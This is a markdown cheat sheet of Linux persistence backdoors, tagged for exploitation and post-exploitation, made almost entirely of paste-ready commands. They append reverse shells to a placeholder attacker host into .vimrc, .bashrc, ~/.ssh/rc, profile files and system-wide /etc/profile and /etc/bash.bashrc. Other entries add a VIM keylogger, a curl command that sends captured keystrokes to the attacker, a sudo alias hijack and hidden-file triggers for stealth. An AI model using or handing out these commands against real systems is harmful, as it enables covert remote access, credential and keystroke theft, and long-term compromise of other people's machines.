---
tags:
  - Exploitation
  - Foundational
  - Linux
  - Post_Exploitation
---

## VIM Config Backdoor
resources: [HackTricks - Linux Persistence](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)

> [!tip] Modify user's **.vimrc** to execute commands when VIM is launched.

### Basic VIM Backdoor [Remote]
```bash
echo 'silent !nc -e /bin/bash <AttackerIP> <Port> &' >> ~/.vimrc
```

### VIM Reverse Shell on Open [Remote]
```bash
cat >> ~/.vimrc << 'EOF'
:silent !bash -c 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &'
:redraw!
EOF
```

### VIM Backdoor with Condition [Remote]
```bash
cat >> ~/.vimrc << 'EOF'
if filereadable("/tmp/.trigger")
    :silent !bash -c 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &'
endif
EOF
```

### Stealthy Backdoor (File-Based Trigger) [Remote]
```bash
cat >> ~/.vimrc << 'EOF'
autocmd VimEnter * if filereadable(expand("~/.cache/.x")) | silent !~/.cache/.x | endif
EOF
```

## VIM Config Keylogger

> [!danger] Log all keystrokes in VIM sessions.

### Basic VIM Keylogger [Remote]
```bash
cat >> ~/.vimrc << 'EOF'
autocmd VimLeave * :silent !echo "$(date): $(cat /tmp/.vimlog)" >> ~/.vim_history
autocmd InsertCharPre * :silent !echo -n "%s" >> /tmp/.vimlog
EOF
```

### Log to Remote Server [Remote]
```bash
cat >> ~/.vimrc << 'EOF'
autocmd VimLeave * if filereadable("/tmp/.vimbuf") | silent !curl -X POST -d @/tmp/.vimbuf http://<AttackerIP>/log 2>/dev/null | endif
EOF
```

## Bashrc Backdoor

### Reverse Shell on Login [Remote]
```bash
echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> ~/.bashrc
```

### Conditional Backdoor [Remote]
```bash
cat >> ~/.bashrc << 'EOF'
if [ -f /tmp/.runme ]; then
    bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &
    rm /tmp/.runme
fi
EOF
```

### Alias Hijacking [Remote]
```bash
echo "alias sudo='sudo bash -c '\''bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &'\''; sudo'" >> ~/.bashrc
```

## SSH RC Backdoor

### Execute on SSH Login [Remote]
```bash
echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> ~/.ssh/rc
chmod +x ~/.ssh/rc
```

## Profile Backdoors

### .profile Backdoor [Remote]
```bash
echo 'nohup bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> ~/.profile
```

### .bash_profile Backdoor [Remote]
```bash
echo 'nohup nc -e /bin/bash <AttackerIP> <Port> &' >> ~/.bash_profile
```

## System-Wide Backdoors (Requires Root)

### /etc/profile Backdoor [Remote]
```bash
echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> /etc/profile
```

### /etc/bash.bashrc Backdoor [Remote]
```bash
echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> /etc/bash.bashrc
```
